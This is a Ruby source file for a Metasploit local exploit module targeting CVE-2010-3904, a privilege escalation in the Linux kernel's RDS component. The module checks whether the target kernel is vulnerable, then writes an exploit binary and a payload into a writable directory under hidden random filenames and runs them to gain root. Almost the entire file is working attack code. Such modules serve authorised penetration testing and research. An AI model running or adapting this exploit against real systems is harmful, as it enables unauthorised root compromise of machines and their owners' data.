# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  moved_from &#039;exploit/linux/local/rds_priv_esc&#039;

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Reliable Datagram Sockets (RDS) rds_page_copy_user Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the `rds_page_copy_user` function
        in `net/rds/page.c` (RDS) in Linux kernel versions 2.6.30 to 2.6.36-rc8
        to execute code as root (CVE-2010-3904).

        This module has been tested successfully on:

        Fedora 13 (i686) kernel version 2.6.33.3-85.fc13.i686.PAE; and
        Ubuntu 10.04 (x86_64) with kernel version 2.6.32-21-generic.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Dan Rosenberg&#039;, # Discovery and C exploit
          &#039;bcoles&#039;         # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 20 2010&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;15285&#039; ],
          [ &#039;CVE&#039;, &#039;2010-3904&#039; ],
          [ &#039;BID&#039;, &#039;44219&#039; ],
          [ &#039;URL&#039;, &#039;https://securitytracker.com/id?1024613&#039; ],
          [ &#039;URL&#039;, &#039;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=799c10559d60f159ab2232203f222f18fa3c4a5f&#039; ],
          [ &#039;URL&#039;, &#039;http://vulnfactory.org/exploits/rds-fail.c&#039; ],
          [ &#039;URL&#039;, &#039;http://web.archive.org/web/20101020044047/http://www.vsecurity.com/resources/advisory/20101019-1/&#039; ],
          [ &#039;URL&#039;, &#039;http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c&#039; ],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;    => 10,
          &#039;PrependFork&#039; => true
        },
      &#039;Notes&#039;          =>
        {
          &#039;AKA&#039;         => [&#039;rds-fail.c&#039;],
          &#039;Reliability&#039; => [ UNRELIABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ],
          &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK ]
        },
      &#039;DefaultTarget&#039;  => 0))
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [ false, &#039;Override check result&#039;, false ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def modules_disabled?
    modules_disabled = cmd_exec(&#039;cat /proc/sys/kernel/modules_disabled&#039;).to_s.strip
    (modules_disabled.eql?(&#039;1&#039;) || modules_disabled.eql?(&#039;2&#039;))
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def check
    version = kernel_release
    unless Gem::Version.new(version.split(&#039;-&#039;).first) >= Gem::Version.new(&#039;2.6.30&#039;) &&
           Gem::Version.new(version.split(&#039;-&#039;).first) < Gem::Version.new(&#039;2.6.37&#039;)
      return CheckCode::Safe("Linux kernel version #{version} is not vulnerable")
    end
    vprint_good "Linux kernel version #{version} appears to be vulnerable"

    unless cmd_exec(&#039;/sbin/modinfo rds&#039;).to_s.include? &#039;Reliable Datagram Sockets&#039;
      return CheckCode::Safe(&#039;RDS kernel module is not available&#039;)
    end
    vprint_good &#039;RDS kernel module is available&#039;

    if modules_disabled?
      unless cmd_exec(&#039;/sbin/lsmod&#039;).to_s.include? &#039;rds&#039;
        return CheckCode::Safe(&#039;RDS kernel module is not loadable&#039;)
      end
    end
    vprint_good &#039;RDS kernel module is loadable&#039;

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    executable_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"

    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile executable_path, exploit_data(&#039;cve-2010-3904&#039;, &#039;rds-fail.c&#039;)
    else
      arch = kernel_hardware
      case arch
      when /amd64|ia64|x86_64|x64/i
        upload_and_chmodx executable_path, exploit_data(&#039;cve-2010-3904&#039;, &#039;rds-fail.x64&#039;)
      when /x86|i[3456]86/
        upload_and_chmodx executable_path, exploit_data(&#039;cve-2010-3904&#039;, &#039;rds-fail.x86&#039;)
      else
      end
    end

    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status &#039;Launching exploit...&#039;
    output = cmd_exec "#{executable_path} #{payload_path}"
    output.each_line { |line| vprint_status line.chomp }
  end
end

